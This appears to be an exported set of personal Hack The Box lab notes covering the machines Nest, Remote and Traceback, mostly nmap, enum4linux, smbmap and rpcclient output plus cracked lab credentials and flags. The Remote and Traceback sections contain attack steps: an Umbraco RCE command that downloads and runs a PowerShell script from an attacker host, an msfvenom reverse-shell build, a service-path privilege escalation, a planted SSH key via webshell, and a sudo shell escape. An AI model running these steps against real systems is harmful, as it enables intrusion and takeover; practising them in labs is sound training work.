Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Keys, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># TPM Devices, EGOTISTICAL-BANK.LOCAL<br />dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Builtin, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># Hugo Smith, EGOTISTICAL-BANK.LOCAL<br />dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL<br /><br /># search reference<br />ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST<br /> ICAL-BANK,DC=LOCAL<br /><br /># search reference<br />ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST<br /> ICAL-BANK,DC=LOCAL<br /><br /># search reference<br />ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC<br /> AL<br /><br /># search result<br />search: 2<br />result: 0 Success<br /><br /># numResponses: 19<br /># numEntries: 15<br /># numReferences: 3<br /></div><div class='page'><h1 class='title level-6'>flags</h1><br/>user<br />1b5520b98d97cf17f24122a55baf70cf<br />root<br />f3ee04965c68257382e31502cc5e881f</div><div class='page'><h1 class='title level-4'>10.10.10.178 Nest</h1><br/>Smb stuff to get user (easy peasy except for witchcraft vb stuff).<br />Smb and HQK stuff to get root (easy peasy except for witchcraft dnspy stuff.)</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>users:<br />Administrator                   &lt;Rid Verified<br />C.Smith                             &lt; Rid verified<br />L.Frost<br />R.THompson<br />TempUser                            &lt;Rid Verified<br />        <br />ReadOnly<br />Data<br />Users<br /><br />ReadOnly as TempUser<br />Secure$<br /><br />Domain: HTB-Nest<br /><br />creds<br />TempUser:welcome2019<br />L.Frost:welcome2019<br />R.Thompson:welcome2019<br />c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=                    carl<br />c.smith:xRxRxPANCAK3SxRxRx<br /><br />/Secure$/IT/Carl/<br />xRxRxPANCAK3SxRxRx<br /><br />Passwords:<br />WBQ201953D8w<br /><br /><br />User=Administrator<br />Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=<br />dnspy witchcraft<br />XtH4nkS4Pl4y1nGx</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.178 &amp;&amp; nmap -sC -sV -Pn 10.10.10.178 &amp;&amp; nmap -p- -Pn 10.10.10.178<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-20 10:50 EDT<br />Nmap scan report for 10.10.10.178<br />Host is up (0.12s latency).<br />Not shown: 999 filtered ports<br />PORT    STATE SERVICE<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-20 10:50 EDT<br />Nmap scan report for 10.10.10.178<br />Host is up (0.12s latency).<br />Not shown: 999 filtered ports<br />PORT    STATE SERVICE       VERSION<br />445/tcp open  microsoft-ds?<br /><br />Host script results:<br />|_clock-skew: -21s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-20T14:50:47<br />|_  start_date: 2020-04-20T14:31:40<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 66.32 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-20 10:51 EDT<br />Nmap scan report for 10.10.10.178<br />Host is up (0.12s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE SERVICE<br />445/tcp  open  microsoft-ds<br />4386/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 166.14 second</div><div class='page'><h1 class='title level-6'>Emum4Linux</h1><br/>enum4linux -a 10.10.10.178<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Apr 20 10:52:55 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.178<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.178    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.178    |<br /> ============================================ <br />Looking up status of 10.10.10.178<br />No reply from 10.10.10.178<br /><br /> ===================================== <br />|    Session Check on 10.10.10.178    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[+] Server 10.10.10.178 allows sessions using username &#39;&#39;, password &#39;&#39;<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.178    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED<br />could not obtain sid from server<br />error: NT_STATUS_ACCESS_DENIED<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ====================================== <br />|    OS information on 10.10.10.178    |<br /> ====================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.10.10.178 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[E] Can&#39;t get OS info with srvinfo: NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.178    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />[E] Couldn&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />[E] Couldn&#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.178    |<br /> ========================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.178<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.178    |<br /> ==================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.10.10.178 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: [Errno Connection error (10.10.10.178:139)] timed out<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br />[E] Failed to get password policy with rpcclient<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.178    |<br /> ============================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting builtin groups:<br />[E] Can&#39;t get builtin groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting local groups:<br />[E] Can&#39;t get local groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting local group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br /><br />[+] Getting domain groups:<br />[E] Can&#39;t get domain groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================= <br />|    Users on 10.10.10.178 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.178    |<br /> ============================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br />could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED<br />could not obtain sid from server<br />error: NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Mon Apr 20 10:54:28 2020<br /></div><div class='page'><h1 class='title level-6'>smb nmap</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Nest$ nmap --script smb-vuln* -Pn -p 139,445 10.10.10.178 <br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-20 10:54 EDT<br />Nmap scan report for 10.10.10.178<br />Host is up (0.12s latency).<br /><br />PORT    STATE    SERVICE<br />139/tcp filtered netbios-ssn<br />445/tcp open     microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds<br /></div><div class='page'><h1 class='title level-6'>squids smb</h1><br/>SquidsSmbTool 10.10.10.178 yeet.wtf<br />Would you like to jump to credentialed scans?<br />&gt; n<br /><br />command1 = &quot;smb -H 10.10.10.178&quot;<br />command2 = &quot;smb -H 10.10.10.178 -u null -p null&quot;<br />command3 = &quot;smbclient -N -L //10.10.10.178&quot;<br />	smbclient -N &#39;//10.10.10.178/coolshare&#39;<br />command4 = &quot;rpcclient 10.10.10.178&quot;<br />command5 = &quot;rpcclient -U &#39;&#39; 10.10.10.178&quot;<br />	enumdomusers<br />	queryuser tony<br />	queryusergroups 0x47b<br />	querygroup 0x201<br />	exit<br />command6 = &quot;crackmapexec smb 10.10.10.178&quot;<br />command7 = &quot;crackmapexec smb 10.10.10.178 --pass-pol -u &#39;&#39; -p &#39;&#39;&quot;<br />command8 = &quot;GetADUsers.py -dc-ip 10.10.10.178 &#39;yeet.wtf/&#39; -all&quot;<br />command9 = &quot;GetNPUsers.py -dc-ip 10.10.10.178 -request &#39;yeet.wtf/&#39; -format hashcat&quot;<br />command10= &quot;GetUserSPNs.py -dc-ip 10.10.10.178 -request &#39;yeet.wtf/&#39;&quot;<br />command11= &quot;getArch.py -target 10.10.10.178&quot;<br /><br />smbmap -H 10.10.10.178<br /><br />[+] Finding open SMB ports....<br />[+] User SMB session established on 10.10.10.178...<br />[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      <br />	Disk                                                  	Permissions	Comment<br />	----                                                  	-----------	-------<br />[!] Access Denied<br />smbmap -H 10.10.10.178 -u null -p null<br /><br />[+] Finding open SMB ports....<br />[+] Guest SMB session established on 10.10.10.178...<br />[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      <br />	Disk                                                  	Permissions	Comment<br />	----                                                  	-----------	-------<br />	ADMIN$                                            	NO ACCESS	Remote Admin<br />	C$                                                	NO ACCESS	Default share<br />	.                                                  <br />	dr--r--r--                0 Wed Aug  7 18:53:46 2019	.<br />	dr--r--r--                0 Wed Aug  7 18:53:46 2019	..<br />	dr--r--r--                0 Wed Aug  7 18:58:07 2019	IT<br />	dr--r--r--                0 Mon Aug  5 17:53:41 2019	Production<br />	dr--r--r--                0 Mon Aug  5 17:53:50 2019	Reports<br />	dr--r--r--                0 Wed Aug  7 15:07:51 2019	Shared<br />	Data                                              	READ ONLY	<br />	IPC$                                              	NO ACCESS	Remote IPC<br />	Secure$                                           	NO ACCESS	<br />	.                                                  <br />	dr--r--r--                0 Sat Jan 25 18:04:21 2020	.<br />	dr--r--r--                0 Sat Jan 25 18:04:21 2020	..<br />	dr--r--r--                0 Fri Aug  9 11:08:23 2019	Administrator<br />	dr--r--r--                0 Sun Jan 26 02:21:44 2020	C.Smith<br />	dr--r--r--                0 Thu Aug  8 13:03:29 2019	L.Frost<br />	dr--r--r--                0 Thu Aug  8 13:02:56 2019	R.Thompson<br />	dr--r--r--                0 Wed Aug  7 18:56:02 2019	TempUser<br />	Users                                             	READ ONLY	<br />smbclient -N -L //10.10.10.178<br /><br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	ADMIN$          Disk      Remote Admin<br />	C$              Disk      Default share<br />	Data            Disk      <br />	IPC$            IPC       Remote IPC<br />	Secure$         Disk      <br />	Users           Disk      <br />SMB1 disabled -- no workgroup available<br />rpcclient 10.10.10.178<br /><br />Enter WORKGROUP\squid&#39;s password: <br />Bad SMB2 signature for message<br />[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........<br />[0000] A9 8E C3 BD 89 74 E6 F0   5B 7D AA 0A EB C8 05 8B   .....t.. [}......<br />Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED<br />rpcclient -U &#39;&#39; 10.10.10.178<br /><br />Enter WORKGROUP\&#39;s password: <br />rpcclient $&gt; enumdomusers<br />rpcclient $&gt; queryuser Administrator<br />	User Name   :	Administrator<br />	Full Name   :	<br />	Home Drive  :	<br />	Dir Drive   :	<br />	Profile Path:	<br />	Logon Script:	<br />	Description :	Built-in account for administering the computer/domain<br />	Workstations:	<br />	Comment     :	<br />	Remote Dial :<br />	Logon Time               :	Sun, 26 Jan 2020 02:20:33 EST<br />	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST<br />	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST<br />	Password last set Time   :	Thu, 08 Aug 2019 14:21:23 EDT<br />	Password can change Time :	Thu, 08 Aug 2019 14:21:23 EDT<br />	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT<br />	unknown_2[0..31]...<br />	user_rid :	0x1f4<br />	group_rid:	0x201<br />	acb_info :	0x00000010<br />	fields_present:	0x00ffffff<br />	logon_divs:	168<br />	bad_password_count:	0x00000000<br />	logon_count:	0x0000001c<br />	padding1[0..7]...<br />	logon_hrs[0..21]...<br />rpcclient $&gt; queryuser C.Smith<br />	User Name   :	C.Smith<br />	Full Name   :	Carl Smith<br />	Home Drive  :	<br />	Dir Drive   :	<br />	Profile Path:	<br />	Logon Script:	<br />	Description :	Flag User<br />	Workstations:	<br />	Comment     :	<br />	Remote Dial :<br />	Logon Time               :	Sun, 26 Jan 2020 02:26:18 EST<br />	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST<br />	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST<br />	Password last set Time   :	Thu, 08 Aug 2019 15:49:07 EDT<br />	Password can change Time :	Thu, 08 Aug 2019 15:49:07 EDT<br />	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT<br />	unknown_2[0..31]...<br />	user_rid :	0x3ec<br />	group_rid:	0x201<br />	acb_info :	0x00000210<br />	fields_present:	0x00ffffff<br />	logon_divs:	168<br />	bad_password_count:	0x00000000<br />	logon_count:	0x00000000<br />	padding1[0..7]...<br />	logon_hrs[0..21]...<br />rpcclient $&gt; queryusergroup 0x201<br />command not found: queryusergroup<br />rpcclient $&gt; queryusergroups 0x201<br />result was NT_STATUS_NO_SUCH_USER<br />rpcclient $&gt; querygroup 0x201<br />	Group Name:	None<br />	Description:	Ordinary users<br />	Group Attribute:7<br />	Num Members:5<br />rpcclient $&gt; queryuser L.Frost<br />result was NT_STATUS_NONE_MAPPED<br />rpcclient $&gt; queryuser LFrost<br />result was NT_STATUS_NONE_MAPPED<br />rpcclient $&gt; queryuser L.Frost<br />result was NT_STATUS_NONE_MAPPED<br />rpcclient $&gt; queryuser R.Thompson<br />result was NT_STATUS_NONE_MAPPED<br />rpcclient $&gt; queryuser C.Smith<br />	User Name   :	C.Smith<br />	Full Name   :	Carl Smith<br />	Home Drive  :	<br />	Dir Drive   :	<br />	Profile Path:	<br />	Logon Script:	<br />	Description :	Flag User<br />	Workstations:	<br />	Comment     :	<br />	Remote Dial :<br />	Logon Time               :	Sun, 26 Jan 2020 02:26:18 EST<br />	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST<br />	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST<br />	Password last set Time   :	Thu, 08 Aug 2019 15:49:07 EDT<br />	Password can change Time :	Thu, 08 Aug 2019 15:49:07 EDT<br />	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT<br />	unknown_2[0..31]...<br />	user_rid :	0x3ec<br />	group_rid:	0x201<br />	acb_info :	0x00000210<br />	fields_present:	0x00ffffff<br />	logon_divs:	168<br />	bad_password_count:	0x00000000<br />	logon_count:	0x00000000<br />	padding1[0..7]...<br />	logon_hrs[0..21]...<br />rpcclient $&gt; queryuser TempUser<br />	User Name   :	TempUser<br />	Full Name   :	TempUser<br />	Home Drive  :	<br />	Dir Drive   :	<br />	Profile Path:	<br />	Logon Script:	<br />	Description :	Temp User Account<br />	Workstations:	<br />	Comment     :	<br />	Remote Dial :<br />	Logon Time               :	Sun, 26 Jan 2020 02:22:13 EST<br />	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST<br />	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST<br />	Password last set Time   :	Mon, 05 Aug 2019 18:08:48 EDT<br />	Password can change Time :	Mon, 05 Aug 2019 18:08:48 EDT<br />	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT<br />	unknown_2[0..31]...<br />	user_rid :	0x3ea<br />	group_rid:	0x201<br />	acb_info :	0x00000210<br />	fields_present:	0x00ffffff<br />	logon_divs:	168<br />	bad_password_count:	0x00000000<br />	logon_count:	0x00000002<br />	padding1[0..7]...<br />	logon_hrs[0..21]...<br />rpcclient $&gt; exit<br />crackmapexec smb 10.10.10.178<br /><br />SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)<br />crackmapexec smb 10.10.10.178 --pass-pol -u &#39;&#39; -p &#39;&#39;<br /><br />SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)<br />SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\: STATUS_ACCESS_DENIED <br /><br />GetADUsers.py -dc-ip 10.10.10.178 &#39;yeet.wtf/&#39; -all<br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br />[Errno 110] Connection timed out<br />GetNPUsers.py -dc-ip 10.10.10.178 -request &#39;yeet.wtf/&#39; -format hashcat<br /><br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br />[-] [Errno 110] Connection timed out<br />GetUserSPNs.py -dc-ip 10.10.10.178 -request &#39;yeet.wtf/&#39;<br /><br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br /><br />[-] [Errno 110] Connection timed out<br />getArch.py -target 10.10.10.178<br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br />[*] Gathering OS architecture for 1 machines<br />[*] Socket connect timeout set to 2 secs<br />[-] 10.10.10.178: Could not connect: timed out<br />Would you like to start credentialed scans?<br />&gt; ^CTraceback (most recent call last):<br />  File &quot;/usr/bin/SquidsSmbTool&quot;, line 98, in &lt;module&gt;<br />    main()<br />  File &quot;/usr/bin/SquidsSmbTool&quot;, line 22, in main<br />    scans()<br />  File &quot;/usr/bin/SquidsSmbTool&quot;, line 62, in scans<br />    q2 = input(&quot;Would you like to start credentialed scans?\n&gt; &quot;)<br />KeyboardInterrupt<br /></div><div class='page'><h1 class='title level-4'>10.10.10.180 Remote</h1><br/>nmap showed me that many ports were open.<br />smb anonymous was able to connect but there was nothing interesting to find<br />with web I could see tons of dirs and a login page but I was not able to brute force it.<br />nmap did show that nfs was open,<br />    showmound -e 10.10.10.180 showed me that /site_backups was available to me!<br />    mount -t nfs  10.10.10.180:/site_backups /mnt/<br /><br />once mounted I used the github tool HawkEye made by Ice3man543 to find files of interest.<br />/Yeet/Machines/HTB/Remote/hawkeye/hawkeye -d /mnt/<br /> It showed displayed that there was a file in App_Data named Umbraco.sdf that would be interesting<br />sdf files are a kind of sql database file that I couldn&#39;t figure out how to mount to anything.<br />turns out cat and more worked just fine!!<br /><br />Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d<br />adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50<br />adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f<br />smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e<br />ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749<br /><br />this was the actual hash<br />b8be16afba8c314ad33d812f22a04991b90e2aaa    baconandcheese<br /><br />with this I was able to login as admin to the website!<br />As previoulsy stated the machine is running Umbraco 7 which searchsploit says is vulnerable<br />there is an exploit for it on kali (46153.py) but I find it easier to go to github and find someone who allready crafted it to take input (Umbraco-RCE).<br /><br />nc -nlvp 3232<br />/Yeet/Machines/HTB/Remote/Umbraco-RCE# python3.8 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180&#39; -c powershell.exe -a &quot;-NoProfile -Command IEX(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/3232.ps1&#39;)&quot;<br /><br />user shell and user.txt!!<br /><br /><br />msfvenom -p windows/shell_reverse_tcp lhost =10.10.14.60 lport=3233 -f exe --platform windows &gt; 3233.exe<br />I cheated to find that i could edit a service running as nt authority\system &gt;&gt;&gt;&gt;&gt;&gt; PowerUp.ps1 would have done the trick<br />wmic service where started=true get name,startname      &lt;not important, but a cool new way to show process<br />sc.exe  status UsoSvc   (not sc, that is something else in powershell)<br />sc.exe stop UsoSvc<br />sc.exe config UsoSvc binpath=&quot;C:\users\public\3233.exe&quot;<br />start nc listener<br />sc.exe start UsoSvc<br /><br />...<br />rooted!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>admin@htb.local baconandcheese</div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>Scanned at 2020-04-08 10:31:01 EDT for 9s<br /><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />NSE: Script Post-scanning.<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap 10.10.10.180 &amp;&amp; nmap -sC -sV 10.10.10.180 &amp;&amp; nmap -p- 10.10.10.180<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-08 10:26 EDT<br />Nmap scan report for 10.10.10.180<br />Host is up (0.12s latency).<br />Not shown: 993 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />111/tcp  open  rpcbind<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />2049/tcp open  nfs<br /><br />Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-08 10:26 EDT<br />Nmap scan report for 10.10.10.180<br />Host is up (0.12s latency).<br />Not shown: 993 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           Microsoft ftpd<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-title: Home - Acme Widgets<br />111/tcp  open  rpcbind       2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version    port/proto  service<br />|   100000  2,3,4        111/tcp   rpcbind<br />|   100000  2,3,4        111/tcp6  rpcbind<br />|   100000  2,3,4        111/udp   rpcbind<br />|   100000  2,3,4        111/udp6  rpcbind<br />|   100003  2,3         2049/udp   nfs<br />|   100003  2,3         2049/udp6  nfs<br />|   100003  2,3,4       2049/tcp   nfs<br />|   100003  2,3,4       2049/tcp6  nfs<br />|   100005  1,2,3       2049/tcp   mountd<br />|   100005  1,2,3       2049/tcp6  mountd<br />|   100005  1,2,3       2049/udp   mountd<br />|   100005  1,2,3       2049/udp6  mountd<br />|   100021  1,2,3,4     2049/tcp   nlockmgr<br />|   100021  1,2,3,4     2049/tcp6  nlockmgr<br />|   100021  1,2,3,4     2049/udp   nlockmgr<br />|   100021  1,2,3,4     2049/udp6  nlockmgr<br />|   100024  1           2049/tcp   status<br />|   100024  1           2049/tcp6  status<br />|   100024  1           2049/udp   status<br />|_  100024  1           2049/udp6  status<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp  open  microsoft-ds?<br />2049/tcp open  mountd        1-3 (RPC #100005)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: -8s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-08T14:27:30<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 151.80 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-08 10:29 EDT<br />Nmap scan report for 10.10.10.180<br />Host is up (0.12s latency).<br />Not shown: 65519 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />80/tcp    open  http<br />111/tcp   open  rpcbind<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />2049/tcp  open  nfs<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49668/tcp open  unknown<br />49679/tcp open  unknown<br />49680/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2256.35 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />caa705d07837cb1a56e1cd960f8eef11<br />root<br />08e3d9f2e8933bca70f9a196d55e9ce8</div><div class='page'><h1 class='title level-4'>10.10.10.181 Traceback</h1><br/>nmap showed that 22 and 80 were open<br />dirsearch showed that there was a .php that got a 404 and nothing else<br />the page said some thing about “Some of the best web shells that you might need”<br />googleing this got me to a github page with webshells that the owner of the box had forked!<br />git clone https://github.com/TheBinitGhimire/Web-Shells.git<br /><br />cd Web-Shells<br />for file in *;do echo $file &gt;&gt; webshells.txt ; done<br /> /Yeet/Tools/dirsearch/dirsearch.py -w Web-Shells/webshells.txt -u http://10.10.10.181:80/ -e php<br /> smevk.php is a hit!<br /> navigate to the website and you can see that it is a pretty webshell that will let you upload a file to anywhere webadmin is able to.<br /><br />I decided to create an ssh key (with ssh-keygen) pair and upload the public key to /home/webadmin/.ssh/authorized_keys    (the public key was named authorized_keys)<br />ssh -i id_rsa webadmin@10.10.10.181  #success<br />no user.txt yet<br /><br />sudo -l says that I can run /home/sysadmin/luvit as sysadmin and a note.txt said that sysadmin left a tool to practice lua<br />to GTFOBINS!!<br />sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39;<br />user.txt!<br /><br />after initial enumeration, pspy32 showed me:<br />    sleep 32<br />    /bin/sh -c sleep 30 ; /bin/cp 